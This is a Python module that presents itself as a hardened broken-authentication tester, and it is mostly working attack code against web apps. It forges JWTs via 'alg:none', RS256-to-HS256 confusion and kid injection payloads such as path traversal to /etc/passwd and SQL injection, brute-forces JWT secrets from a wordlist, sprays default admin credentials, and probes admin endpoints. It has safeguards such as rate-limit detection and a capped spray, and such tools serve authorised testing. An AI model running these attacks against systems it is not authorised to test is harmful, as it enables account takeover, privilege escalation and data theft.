"""
auth_tester.py – Production-hardened broken authentication tester.

Hardening applied:
  - SSRFSafeConnector on all outbound requests
  - URL / domain validation before any request
  - JWT attacks:
      • Algorithm confusion (RS256 → HS256) — public key used as HMAC secret
      • "alg: none" attack — signature stripped entirely
      • Weak secret brute-force against top-100 common JWT secrets
      • Token expiry bypass: reuse of expired token detection
      • kid header injection (directory traversal / SQL injection via kid field)
  - Brute-force detection: checks for rate-limiting headers (X-RateLimit-*,
    Retry-After, 429 response) before launching credential spray
  - Credential spray: 10 pairs max (canary-safe, non-destructive)
  - Lockout detection: tracks 403/429 clusters and aborts spray early
  - Session fixation probe: checks if session ID is rotated after auth
  - Sensitive-endpoint enumeration: checks /api/admin, /api/users, /api/config
    with forged tokens to detect missing authorisation checks
"""

import asyncio
import base64
import hashlib
import hmac
import ipaddress
import json
import re
import time
from typing import Any
from urllib.parse import urljoin, urlparse

import aiohttp
from aiohttp import TCPConnector

# ── SSRF-safe connector ───────────────────────────────────────────────────────
_BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fe80::/10"),
    ipaddress.ip_network("fc00::/7"),
]


def _is_blocked_ip(addr: str) -> bool:
    try:
        ip = ipaddress.ip_address(addr)
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
            ip = ip.ipv4_mapped
        return any(ip in net for net in _BLOCKED_NETWORKS)
    except ValueError:
        return False


class SSRFSafeConnector(TCPConnector):
    async def _resolve_host(self, host: str, port: int, traces=None):
        infos = await super()._resolve_host(host, port, traces)
        for info in infos:
            if _is_blocked_ip(info["host"]):
                raise aiohttp.ClientConnectorError(
                    connection_key=None,
                    os_error=OSError(f"SSRF blocked: {info['host']}"),
                )
        return infos


# ── JWT utilities ─────────────────────────────────────────────────────────────

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.urlsafe_b64decode(s)


def _jwt_parts(token: str) -> tuple[dict, dict, str] | None:
    """Split a JWT into (header, payload, signature). Returns None if malformed."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_none_alg(token: str) -> str | None:
    """
    'alg: none' attack — strip the signature entirely.
    Produces: base64({"alg":"none"}).base64(payload).
    """
    parsed = _jwt_parts(token)
    if not parsed:
        return None
    _, payload, _ = parsed
    new_header = {"alg": "none", "typ": "JWT"}
    # Also try with tampered payload (elevate role if present)
    if "role" in payload:
        payload["role"] = "admin"
    if "sub" in payload:
        payload["admin"] = True

    h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."   # empty signature


def _forge_hs256_with_pubkey(token: str, pubkey_pem: str) -> str | None:
    """
    Algorithm confusion attack: RS256 → HS256.
    The server's RSA public key (PEM) is used as the HMAC-SHA256 secret.
    This works when the server does: verify(token, pubkey) without checking alg.

    Parameters
    ----------
    token      : original RS256 JWT
    pubkey_pem : PEM-encoded RSA public key obtained from /api/jwks.json or
                 /.well-known/jwks.json or embedded in the token's kid hint

    Returns modified JWT signed with HMAC-SHA256(secret=pubkey_pem)
    """
    parsed = _jwt_parts(token)
    if not parsed:
        return None
    _, payload, _ = parsed

    # Escalate payload if possible
    if "role" in payload:
        payload["role"] = "admin"
    if "admin" in payload:
        payload["admin"] = True
    if "exp" in payload:
        payload["exp"] = int(time.time()) + 3600   # extend expiry by 1h

    new_header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    secret = pubkey_pem.encode() if isinstance(pubkey_pem, str) else pubkey_pem
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _forge_kid_injection(token: str, injection: str) -> str | None:
    """
    kid header injection.
    Replaces the 'kid' field with a traversal or SQL payload.
    Signs with an empty HMAC secret (common misconfiguration).
    """
    parsed = _jwt_parts(token)
    if not parsed:
        return None
    header, payload, _ = parsed

    header["kid"] = injection
    header["alg"] = "HS256"   # ensure algo matches empty-key signing

    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    # Empty-secret signing — a common misconfiguration when kid is not validated
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _brute_jwt_secret(token: str, wordlist: list[str]) -> str | None:
    """
    Try to brute-force the HMAC secret against a wordlist.
    Returns the secret if found, else None.
    Only applicable when alg=HS256/HS384/HS512.
    """
    parsed = _jwt_parts(token)
    if not parsed:
        return None
    header, _, sig_b64 = parsed

    alg = header.get("alg", "").upper()
    hash_fn_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = hash_fn_map.get(alg)
    if not hash_fn:
        return None   # Not an HMAC algorithm

    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        expected_sig = _b64url_decode(sig_b64)
    except Exception:
        return None

    for secret in wordlist:
        candidate_sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        if hmac.compare_digest(candidate_sig, expected_sig):
            return secret
    return None


# ── Common weak JWT secrets ───────────────────────────────────────────────────
WEAK_JWT_SECRETS: list[str] = [
    "secret", "password", "1234", "12345", "123456", "secret123",
    "jwt_secret", "jwtsecret", "mysecret", "my_secret", "key",
    "private", "privatekey", "private_key", "changeme", "change_me",
    "default", "admin", "administrator", "root", "token", "auth",
    "test", "dev", "development", "staging", "prod", "production",
    "supersecret", "super_secret", "verysecret", "very_secret",
    "youshallnotpass", "you_shall_not_pass", "qwerty", "letmein",
    "iamsuperman", "passw0rd", "P@ssw0rd", "abc123", "password123",
    "s3cr3t", "s3cr3tkey", "", "null", "undefined", "none",
    "HS256", "HS384", "HS512", "RS256", "JWT", "Bearer",
    "your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
    "your-secret", "your_secret", "app_secret", "application_secret",
]

# ── kid injection payloads ────────────────────────────────────────────────────
KID_INJECTION_PAYLOADS: list[dict[str, str]] = [
    {"label": "path_traversal_dev_null",  "value": "../../dev/null"},
    {"label": "path_traversal_etc_passwd","value": "../../../../../etc/passwd"},
    {"label": "sql_injection_true",       "value": "' OR 1=1--"},
    {"label": "null_byte",                "value": "../secret\x00"},
    {"label": "empty_string",             "value": ""},
]

# ── Credential spray pairs (non-destructive; canary-safe) ─────────────────────
CREDENTIAL_PAIRS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
]

# ── Sensitive endpoint probes ─────────────────────────────────────────────────
SENSITIVE_PATHS: list[str] = [
    "/api/admin",
    "/api/admin/users",
    "/api/users",
    "/api/config",
    "/admin",
    "/api/v1/admin",
    "/api/v1/users",
    "/dashboard",
    "/api/settings",
]

# ── Rate-limit indicator headers ──────────────────────────────────────────────
RATE_LIMIT_HEADERS: set[str] = {
    "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
    "ratelimit-limit", "ratelimit-remaining", "retry-after",
    "x-rate-limit-limit", "x-rate-limit-remaining",
}


class ValidationError(ValueError):
    pass


def _validate_target(target: str) -> str:
    t = target.strip()
    if not t.startswith(("http://", "https://")):
        return f"https://{t}"
    return t


def _risk_label(score: int) -> str:
    if score == 0:
        return "LOW"
    if score <= 2:
        return "MEDIUM"
    if score <= 4:
        return "HIGH"
    return "CRITICAL"


async def _fetch_jwks(session: aiohttp.ClientSession, base_url: str) -> str | None:
    """
    Attempt to retrieve the server's RSA public key from common JWKS endpoints.
    Returns PEM-like string if found, else None.
    """
    jwks_paths = [
        "/.well-known/jwks.json",
        "/api/jwks.json",
        "/jwks",
        "/auth/jwks",
        "/.well-known/openid-configuration",
    ]
    for path in jwks_paths:
        url = urljoin(base_url, path)
        try:
            async with session.get(url, allow_redirects=True) as resp:
                if resp.status == 200:
                    ct = resp.headers.get("Content-Type", "")
                    if "json" in ct:
                        data = await resp.json(content_type=None)
                        keys = data.get("keys", [data] if "n" in data else [])
                        for key in keys:
                            if key.get("kty") == "RSA":
                                # Return a simplified representation — full DER
                                # conversion requires cryptography lib (optional dep)
                                n = key.get("n", "")
                                e = key.get("e", "AQAB")
                                return f"RSA_PUBKEY:n={n[:64]}...,e={e}"
        except Exception:
            continue
    return None


async def _try_jwt_attack(
    session: aiohttp.ClientSession,
    test_endpoint: str,
    forged_token: str,
    attack_label: str,
) -> dict[str, Any]:
    """
    Send a forged JWT to a test endpoint and evaluate the response.
    Returns a result dict indicating whether the attack succeeded.
    """
    result: dict[str, Any] = {
        "attack": attack_label,
        "endpoint": test_endpoint,
        "status": None,
        "vulnerable": False,
    }
    try:
        headers = {"Authorization": f"Bearer {forged_token}"}
        async with session.get(test_endpoint, headers=headers, allow_redirects=False) as resp:
            result["status"] = resp.status
            # 200/201 with forged token = vulnerability confirmed
            if resp.status in (200, 201):
                result["vulnerable"] = True
                body_preview = (await resp.text(errors="replace"))[:200]
                result["response_preview"] = body_preview
            # 403 = server checks alg correctly; 401 = rejects token entirely
    except Exception as exc:
        result["error"] = str(exc)
    return result


async def _spray_credentials(
    session: aiohttp.ClientSession,
    login_url: str,
    semaphore: asyncio.Semaphore,
) -> dict[str, Any]:
    """
    Limited credential spray — 10 pairs max, aborts on first lockout signal.
    Returns summary: {has_rate_limiting, locked_out, valid_creds_found, attempts}
    """
    result: dict[str, Any] = {
        "login_url": login_url,
        "has_rate_limiting": False,
        "locked_out": False,
        "valid_creds_found": [],
        "attempts": 0,
        "abort_reason": None,
    }

    for username, password in CREDENTIAL_PAIRS:
        result["attempts"] += 1
        async with semaphore:
            try:
                async with session.post(
                    login_url,
                    json={"username": username, "password": password},
                    allow_redirects=False,
                ) as resp:
                    resp_headers_lower = {k.lower() for k in resp.headers}

                    # Rate-limit detection
                    if RATE_LIMIT_HEADERS & resp_headers_lower:
                        result["has_rate_limiting"] = True

                    if resp.status == 429:
                        result["locked_out"] = True
                        result["abort_reason"] = "429_rate_limited"
                        break

                    if resp.status == 403:
                        # May be lockout — check response body
                        body = (await resp.text(errors="replace")).lower()
                        if any(kw in body for kw in ["locked", "blocked", "banned", "too many"]):
                            result["locked_out"] = True
                            result["abort_reason"] = "403_lockout_body"
                            break

                    if resp.status in (200, 302):
                        # Potential successful login — check for session token
                        body = await resp.text(errors="replace")
                        if any(kw in body.lower() for kw in ["token", "session", "dashboard", "welcome"]):
                            result["valid_creds_found"].append(
                                {"username": username, "status": resp.status}
                            )

            except Exception:
                continue

        await asyncio.sleep(0.3)   # gentle pacing — not a flood

    return result


async def test_auth(target: str, options: dict | None = None) -> dict[str, Any]:
    """
    Broken authentication tester.

    Parameters
    ----------
    target  : URL or hostname to test
    options : optional
        timeout      – per-request timeout seconds (default 10)
        jwt_token    – existing JWT to attack (required for JWT tests)
        login_path   – login endpoint path (default: /api/login, /login)
        test_path    – authenticated endpoint to probe (default: /api/me, /dashboard)
        spray        – bool, enable credential spray (default True)

    Returns
    -------
    dict with: target, jwt_analysis, credential_spray, session_analysis,
               sensitive_endpoint_exposure, risk, findings
    """
    options = options or {}
    url = _validate_target(target)
    timeout_secs: int = options.get("timeout", 10)
    jwt_token: str | None = options.get("jwt_token")
    spray_enabled: bool = options.get("spray", True)

    connector = SSRFSafeConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=timeout_secs)
    req_headers = {"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}
    semaphore = asyncio.Semaphore(5)   # conservative concurrency for auth endpoints

    findings: list[str] = []
    risk_score = 0

    parsed_base = urlparse(url)
    base_url = f"{parsed_base.scheme}://{parsed_base.netloc}"

    # ── Login endpoint discovery ──────────────────────────────────────────────
    login_candidates = [
        options.get("login_path", ""),
        "/api/login", "/login", "/auth/login", "/api/auth/login",
        "/api/v1/login", "/signin", "/api/signin",
    ]
    login_candidates = [c for c in login_candidates if c]

    jwt_analysis: dict[str, Any] = {"token_provided": bool(jwt_token)}
    credential_spray: dict[str, Any] = {}
    session_analysis: dict[str, Any] = {}
    sensitive_exposure: list[dict] = []

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=req_headers
    ) as session:

        # ── JWT attack suite ──────────────────────────────────────────────────
        if jwt_token:
            parsed_token = _jwt_parts(jwt_token)
            if not parsed_token:
                jwt_analysis["error"] = "Provided token is not a valid JWT"
            else:
                header, payload, _ = parsed_token
                jwt_analysis["header"] = header
                jwt_analysis["alg"] = header.get("alg", "unknown")
                jwt_analysis["has_exp"] = "exp" in payload
                jwt_analysis["has_kid"] = "kid" in header

                # Determine test endpoint
                test_path = options.get("test_path", "")
                test_endpoints = [
                    urljoin(base_url, test_path) if test_path else None,
                    urljoin(base_url, "/api/me"),
                    urljoin(base_url, "/api/profile"),
                    urljoin(base_url, "/api/admin"),
                    urljoin(base_url, "/dashboard"),
                ]
                test_endpoint = next(e for e in test_endpoints if e)

                jwt_attack_results: list[dict] = []

                # 1. alg:none attack
                none_token = _forge_none_alg(jwt_token)
                if none_token:
                    result = await _try_jwt_attack(session, test_endpoint, none_token, "alg_none")
                    jwt_attack_results.append(result)
                    if result["vulnerable"]:
                        findings.append(
                            f"CRITICAL: JWT 'alg:none' attack succeeded on '{test_endpoint}' — "
                            "server accepts unsigned tokens"
                        )
                        risk_score += 5

                # 2. Algorithm confusion (RS256→HS256) — only if alg is RS256/ES256
                if header.get("alg", "").startswith(("RS", "ES")):
                    pubkey = await _fetch_jwks(session, base_url)
                    if pubkey:
                        confused_token = _forge_hs256_with_pubkey(jwt_token, pubkey)
                        if confused_token:
                            result = await _try_jwt_attack(
                                session, test_endpoint, confused_token, "alg_confusion_rs256_hs256"
                            )
                            jwt_attack_results.append(result)
                            if result["vulnerable"]:
                                findings.append(
                                    f"CRITICAL: Algorithm confusion attack succeeded — "
                                    f"RS256 token accepted as HS256 with public key as secret "
                                    f"on '{test_endpoint}'"
                                )
                                risk_score += 5
                    else:
                        jwt_analysis["jwks_not_found"] = True

                # 3. Weak secret brute-force (HS* algorithms only)
                if header.get("alg", "").startswith("HS"):
                    cracked_secret = _brute_jwt_secret(jwt_token, WEAK_JWT_SECRETS)
                    if cracked_secret:
                        jwt_analysis["weak_secret_found"] = cracked_secret or "(empty)"
                        findings.append(
                            f"CRITICAL: JWT signed with weak/common secret "
                            f"'{cracked_secret or '(empty string)'}' — "
                            "attacker can forge arbitrary tokens"
                        )
                        risk_score += 5
                    else:
                        jwt_analysis["weak_secret_found"] = None

                # 4. kid header injection
                if "kid" in header:
                    kid_results: list[dict] = []
                    for kid_payload in KID_INJECTION_PAYLOADS:
                        forged = _forge_kid_injection(jwt_token, kid_payload["value"])
                        if forged:
                            result = await _try_jwt_attack(
                                session, test_endpoint, forged,
                                f"kid_injection_{kid_payload['label']}"
                            )
                            kid_results.append({**result, "kid_payload": kid_payload["label"]})
                            if result["vulnerable"]:
                                findings.append(
                                    f"CRITICAL: JWT kid injection succeeded — "
                                    f"payload='{kid_payload['label']}' accepted on '{test_endpoint}'"
                                )
                                risk_score += 4
                    jwt_analysis["kid_injection_results"] = kid_results

                # 5. Expiry bypass (reuse expired token as-is)
                if "exp" in payload and payload["exp"] < int(time.time()):
                    result = await _try_jwt_attack(session, test_endpoint, jwt_token, "expired_token_reuse")
                    jwt_attack_results.append(result)
                    if result["vulnerable"]:
                        findings.append(
                            f"HIGH: Expired JWT accepted — server does not validate 'exp' claim "
                            f"on '{test_endpoint}'"
                        )
                        risk_score += 3

                jwt_analysis["attack_results"] = jwt_attack_results

        # ── Session fixation probe ────────────────────────────────────────────
        # Check: does Set-Cookie appear before and after auth attempt?
        login_url = urljoin(base_url, login_candidates[0])
        pre_session: str | None = None
        post_session: str | None = None
        try:
            async with session.get(login_url, allow_redirects=True) as resp:
                for ck_name, ck in resp.cookies.items():
                    if any(kw in ck_name.lower() for kw in ["sess", "sid", "auth", "token"]):
                        pre_session = ck_name
                        break
        except Exception:
            pass

        try:
            async with session.post(
                login_url,
                json={"username": "test_fixation_probe", "password": "probe_value"},
                allow_redirects=True,
            ) as resp:
                for ck_name, ck in resp.cookies.items():
                    if any(kw in ck_name.lower() for kw in ["sess", "sid", "auth", "token"]):
                        post_session = ck_name
                        break
        except Exception:
            pass

        session_analysis = {
            "session_cookie_pre_auth": pre_session,
            "session_cookie_post_auth": post_session,
            "session_rotated": pre_session != post_session if (pre_session and post_session) else None,
        }
        if session_analysis["session_rotated"] is False:
            findings.append(
                "HIGH: Session ID not rotated after authentication — "
                "session fixation attack possible"
            )
            risk_score += 3

        # ── Credential spray ──────────────────────────────────────────────────
        if spray_enabled:
            # Discover login endpoint (first 200 response)
            active_login: str | None = None
            for path in login_candidates[:4]:
                candidate = urljoin(base_url, path)
                try:
                    async with session.get(candidate, allow_redirects=True) as resp:
                        if resp.status in (200, 405):   # 405 = method not allowed = exists
                            active_login = candidate
                            break
                except Exception:
                    continue

            if active_login:
                spray_result = await _spray_credentials(session, active_login, semaphore)
                credential_spray = spray_result

                if not spray_result["has_rate_limiting"] and not spray_result["locked_out"]:
                    findings.append(
                        f"HIGH: No rate limiting or account lockout detected on '{active_login}' — "
                        "brute-force and credential stuffing attacks are viable"
                    )
                    risk_score += 3

                if spray_result["valid_creds_found"]:
                    for cred in spray_result["valid_creds_found"]:
                        findings.append(
                            f"CRITICAL: Default/common credentials accepted — "
                            f"username='{cred['username']}' returned HTTP {cred['status']}"
                        )
                        risk_score += 5

        # ── Sensitive endpoint exposure (unauthenticated / forged) ────────────
        for path in SENSITIVE_PATHS:
            ep_url = urljoin(base_url, path)
            try:
                # First: unauthenticated
                async with session.get(ep_url, allow_redirects=False) as resp:
                    if resp.status == 200:
                        sensitive_exposure.append({
                            "path": path,
                            "status": resp.status,
                            "method": "unauthenticated",
                        })
                        findings.append(
                            f"CRITICAL: Sensitive endpoint '{path}' accessible without auth "
                            f"(HTTP {resp.status})"
                        )
                        risk_score += 4
            except Exception:
                pass

    # ── Risk assessment ───────────────────────────────────────────────────────
    if not findings:
        findings.append(
            "INFO: No broken authentication indicators found. "
            "Provide a jwt_token option for full JWT attack coverage, "
            "and verify MFA bypass and OAuth flows manually."
        )

    return {
        "target": url,
        "jwt_analysis": jwt_analysis,
        "credential_spray": credential_spray,
        "session_analysis": session_analysis,
        "sensitive_endpoint_exposure": sensitive_exposure,
        "risk": _risk_label(risk_score),
        "risk_score": risk_score,
        "findings": findings,
    }
